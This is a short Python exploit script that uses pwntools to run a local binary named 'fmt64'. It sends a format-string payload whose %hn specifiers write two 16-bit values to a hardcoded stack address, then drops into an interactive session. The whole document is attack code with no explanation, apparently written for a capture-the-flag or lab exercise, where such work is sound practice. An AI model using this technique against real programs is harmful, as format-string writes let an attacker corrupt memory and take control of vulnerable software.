from pwn import *

p = process('./fmt64')
#raw_input("DEBUG")
target = 0x7fffffffdf3c


payload = b"A"*16
payload += b"%047789x"
payload += b" %14$hn "
payload += b"%004158x"
payload += b" %15$hn "
payload += p64(target)
payload += p64(target+2)


p.sendline(payload)

p.interactive()
